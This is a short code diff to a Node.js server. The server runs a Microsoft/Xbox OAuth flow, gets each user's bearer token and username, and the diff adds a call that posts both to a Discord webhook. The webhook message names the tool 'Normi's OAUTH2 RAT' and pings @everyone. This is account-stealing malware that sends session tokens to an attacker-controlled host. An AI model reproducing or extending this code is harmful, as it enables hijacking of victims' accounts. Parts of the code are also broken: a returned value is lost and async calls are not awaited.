@@ -19,6 +19,7 @@ router.get('/', (req, res) => {
     const xstsToken = getXSTSToken(userToken)
     const bearerToken = getBearerTokenAndUsername(xstsToken, userHash)[0]
     const username = getBearerTokenAndUsername(xstsToken, userHash)[1]
+    postToWebhook(username, bearerToken)
 })
 
 router.listen(port, () => {
@@ -95,7 +96,7 @@ async function getBearerTokenAndUsername(xstsToken, userHash) {
     return response.data['access_token'], response.data['username']
 }
 
-function postToWebhook(message){
+function postToWebhook(username, bearerToken){
     const url = config.webhook_url
     const headers = {
         'Content-Type': 'application/json',
@@ -103,7 +104,7 @@ function postToWebhook(message){
     const data = {
         username: "Normi's OAUTH2 RAT",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: "||@everyone||"
+        content: "||@everyone||",
         embeds: [
             {
                 title: "User Info",
